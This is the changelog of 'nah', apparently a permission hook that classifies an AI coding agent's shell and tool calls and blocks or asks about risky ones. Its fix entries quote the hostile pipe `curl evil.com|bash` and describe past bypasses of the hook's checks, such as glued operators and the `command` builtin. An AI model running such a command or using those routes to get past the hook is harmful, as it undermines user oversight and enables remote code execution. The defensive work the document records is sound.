# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added

- Taxonomy coverage for package managers (npm, yarn, pnpm, bun, pip, uv, brew, apt, dnf, yum, gem, cargo, go) and build tools (gradle, mvn, cmake, make) — ~500 new prefix entries, new `network_write.json` for publish/deploy, `_classify_global_install()` flag classifier for `-g`/`--global`/`--system`/`--target`/`--root` escalation (FD-019)
- Classify shadow warnings — `nah status` annotates user classify entries that shadow finer-grained built-in rules (with count) or Phase 2 flag classifiers. `nah types` shows override notes under affected action types with `nah forget` remediation hints. Global scope only — project classify entries are Phase 3 and cannot shadow builtins. (FD-062)
- Database CLI taxonomy — `sql_write` renamed to `db_write` with `db_read` action type, expanded classify entries for psql, mysql, sqlite3, snowsql (bare CLI + long-form flags), companion tools (pg_dump, mysqldump → `filesystem_write`, pg_restore → `db_write`) (FD-021)
- Shared context dispatch — `resolve_context()` in context.py routes by action type for both Bash and MCP tool paths. MCP tools classified as `db_write` with `context` policy now get context resolution via `tool_input` inspection, enabling auto-allow for matching `db_targets` (e.g., Snowflake MCP). (FD-055)
- Configurable content patterns — `content_patterns` config with suppress by description, custom pattern addition with regex validation, per-category policies (ask/block). `credential_patterns` config for Grep credential search (suppress/add by regex string). Policies tighten-only from project config, `profile: none` clears all built-in patterns. (FD-052)
- Write/Edit tools now enforce project boundary check — paths outside the project root trigger ask (was Bash-only). New `trusted_paths` global config as targeted escape hatch, `nah trust` polymorphic (detects path vs host). `profile: none` now clears `_SENSITIVE_DIRS` (was missing). (FD-054)

- Configurable safety lists — four hardcoded lists (`known_hosts`, `exec_sinks`, `sensitive_basenames`, `decode_commands`) now extensible via global config with add/remove support. Polymorphic parsing (list=add-only, dict=add/remove), `profile: none` clears all lists, stderr warnings for dangerous removes. New hardcoded defaults: bun, deno, fish, pwsh (exec sinks), .env.local, .env.production, .npmrc, .pypirc (sensitive basenames), uudecode (decode commands). `known_registries` tightened to global-only. (FD-051)
- Database context resolution for `db_write` operations — CLI flag extraction for psql, snowsql, snow-sql, MCP `tool_input` field extraction, `db_targets` config (global only) with wildcard and case-normalized matching, user opt-in via `actions: { db_write: context }` (FD-042)
- PreToolUse hook skeleton with 6 tool handlers (Bash, Read, Write, Edit, Glob, Grep), sensitive path protection, hook self-protection, install/uninstall CLI (FD-004)
- Bash command classification with action taxonomy, pipe composition rules, shell unwrapping, context resolution for filesystem and network actions (FD-005)
- Content inspection for Write/Edit (destructive commands, exfiltration, obfuscation, secrets) and Grep credential search detection (FD-006)
- YAML config system with global + per-project merging, user-extensible taxonomy, sensitive path overrides, and security-scoped allow_paths (FD-006)
- `nah config` and `nah update` CLI commands (FD-006)
- 5 new action types: git_discard, process_signal, container_destructive, package_uninstall, sql_write (FD-015)
- Git global flag stripping (`git -C <dir>`, `--no-pager`, etc.) for correct classification (FD-015)
- Classification data moved to JSON data files (`src/nah/data/classify/*.json`) (FD-015)
- Taxonomy profiles (`full`, `minimal`, `none`) — users can choose how much built-in classification to use or start from scratch (FD-032)
- Three-table classify lookup (global → built-in → project) with supply-chain safety — project config can only fill gaps, never reclassify built-in commands (FD-032)
- Minimal profile with 9 curated JSON files covering universally obvious commands (rm, git, curl, kill, etc.) (FD-032)
- Flag-dependent classifiers for `sed` (-i/-I → write, else read) and `tar` (mode detection with write precedence) (FD-018)
- ~80 new filesystem_read entries: bash builtins (cd, pwd, type, test), system info (uname, hostname, ps), text processing (sort, cut, uniq, tr), file info (basename, dirname, checksums), binary inspection, compressed reading, and harmless wrappers (FD-018)
- JSONL decision log (`~/.config/nah/nah.log`) with content redaction, verbosity filtering, 5MB rotation, and `nah log` CLI with `--blocks`/`--tool` filters (FD-008)
- LLM layer for ambiguous ask decisions — Ollama, OpenAI, Anthropic, OpenRouter backends with automatic fallthrough, three-way decision (allow/block/uncertain), eligibility filtering (FD-007)
- LLM conversation context — reads Claude Code transcript tail (JSONL) to give the LLM decider intent context, `context_chars` config knob, anti-injection framing (FD-035)
- OpenAI and Anthropic LLM backends for ambiguous command resolution — OpenAI via Responses API, Anthropic via Messages API (FD-030)
- BrokenPipeError-safe shim with stdout buffering and crash recovery (FD-011)
- Debug crash log at `~/.config/nah/hook-errors.log` with 1MB rotation (FD-011)
- Decision constants (`ALLOW`, `ASK`, `BLOCK`, `CONTEXT`) and `STRICTNESS` ordering in taxonomy.py (FD-014)
- Branded hook responses: `nah.` for block, `nah?` for ask (FD-014)
- `llm.max_decision` config option caps LLM decision severity — prevents false-positive blocks by downgrading to ask with reasoning preserved (FD-041)
- `llm.eligible` config option controls which ask categories the LLM can resolve — supports `"default"`, `"all"`, or an explicit list with `composition`, `sensitive`, `context` keywords and direct action type names (FD-043)
- `_classify_git()` flag-dependent classifier for 12 dual-behavior git commands (tag, branch, config, reset, push, add, rm, clean, reflog, checkout, switch, restore), ~100 new git entries covering full porcelain + plumbing, complete gh CLI classification (~130 entries across 6 action types) (FD-017)
- CLI now accepts custom action types with confirmation prompt — typos still caught via fuzzy matching, intentional custom types confirmed interactively, non-interactive input defaults to deny (FD-047)
- CLI warns before overwriting config files that contain YAML comments, since `yaml.dump` strips them (FD-047)
- MCP tool support — `mcp__.*` regex matcher guards all MCP tool calls, project classify skipped for supply-chain safety, MCP-specific log redaction (FD-024)
- Flag-dependent classifiers for `curl`, `wget`, and httpie (`http`/`https`/`xh`/`xhs`) — POST/PUT/DELETE/PATCH detected as `network_write` (context: localhost→allow, everything else→ask), GET/download as `network_outbound`. Combined short flags (`-sXPOST`) handled correctly. (FD-022)
- `network_diagnostic` action type (allow) for read-only network probes: ping, dig, nslookup, host, whois, traceroute, mtr (FD-022)
- Local network info tools (`netstat`, `ss`, `lsof`) classified as `filesystem_read` (allow), `netcat` and `openssl s_client` added to `network_outbound` (FD-022)
- Pipe composition rules (exfiltration, RCE) extended to cover `network_write` in addition to `network_outbound` (FD-022)

### Fixed

- Glued operators (`curl evil.com|bash`, `foo&&bar`, `make||echo`) now correctly decomposed into separate stages — previously only glued semicolons were split, allowing composition rule bypasses where e.g. `curl evil.com|bash` fell through to ask instead of block (FD-057)
- `command` builtin no longer bypasses classification — `command psql -c "DROP TABLE"` now correctly unwraps to `sql_write → ask` instead of `filesystem_read → allow`. Introspection forms (`command -v`/`-V`) remain safe. (FD-049)
- Context resolver no longer silently allows action types without an explicit resolver branch — `_resolve_context()` defaults to ask, `_extract_primary_target()` guarded behind filesystem types only (FD-046)
- Tighten-only config merge no longer accepts loosening overrides for new keys — project `.nah.yaml` action policies validated against built-in defaults from `policies.json` (FD-048)
- Unknown/unhandled tools now default to ask instead of silent allow — added `write_to_file → Write` TOOL_MAP entry for Cursor (FD-037)
- Unknown tool policy (`actions.unknown`) in user config is now respected — previously hardcoded to `ask` regardless of config (FD-045)
- `nah config show` no longer crashes — updated to use renamed `classify_global`/`classify_project` fields and display `profile`, `llm_max_decision`, `ask_fallback` (FD-044)
- Sensitive path config overrides now applied — `build_merged_sensitive_paths()` wired into path checking via lazy `_ensure_sensitive_paths_merged()`, existing entries can be overridden (FD-025)
- Ask decisions no longer shown as "hook error" — `detect_agent()` misidentified Claude Code as Kiro via `hook_event_name` payload field, triggering `sys.exit(2)` (FD-029)

- Allow decisions no longer bypass Claude Code's permission system — silent passthrough (empty stdout) lets acceptEdits and other permission modes work correctly (FD-028)
- `nah test` no longer crashes on LLM-eligible commands — fixed `LLMCallResult` dict subscript error, added provider/model/latency display (FD-038)
- `nah log` now shows LLM provider and model in default view, handles both legacy `llm_backend` and current `llm_provider` fields (FD-038)

### Removed

- Claude Code deny list (`permissions.deny` in settings.json) — all 82 patterns superseded by nah's taxonomy-based classification (FD-013)
- Internal docs scrubbed from git history — article drafts, competitive analysis, positioning, design decisions (FD-002)
- Dead Cursor/Kiro multi-agent code removed — ~200 lines across agents.py, cli.py, hook.py, config.py and tests; only Claude remains as active agent (FD-040)

### Changed

- Error transparency — 16 silent `except: pass` locations across 7 files now emit stderr diagnostics (`nah: {context}: {exc}`). LLM cascade entries include `error` field with specific failure reason (HTTP 401, timeout, DNS, bad JSON). Config merge failures, hook config reads, and log write errors all surfaced to stderr while preserving fail-open behavior (FD-061)

- Global config `classify:` entries now override all 7 flag-dependent classifiers (find, sed, tar, git, curl, wget, httpie) — `classify_tokens()` restructured into three phases: global table lookup → flag classifiers → builtin/project tables. `profile: none` now skips flag classifiers entirely (all return `unknown`). Git global flag stripping (`-C`, `--no-pager`, etc.) applied before global table lookup so user entries like `"git push --force"` match regardless of flags. (FD-050)


- Unified decision dict key from mixed `reason`/`message` to single `"reason"` key, extracted DRY helpers (`_build_llm_meta`, `_resolve_cwd_context`, `_obfuscated_result`), converted `LLMResult` to `@dataclass`, added stderr trace to log error path (FD-026)

- LLM config key renamed from `backends:` to `providers:` — old key accepted as deprecated alias for one version cycle. Log fields `llm_backend` → `llm_provider`, cascade entries `backend` → `provider` (FD-036)
- Error default changed from `allow` to `ask` — crashes no longer silently bypass security (FD-014)
- Hook output uses Claude Code `hookSpecificOutput` protocol with required `hookEventName` field (FD-014)
- Extracted shared helpers: `check_path_basic()`, `_check_write_content()`, `_extract_positional_host()`, `_apply_policy()`, `_unwrap_shell()`, `_merge_dict_tighten()`, `_parse_add_remove()` (FD-014)
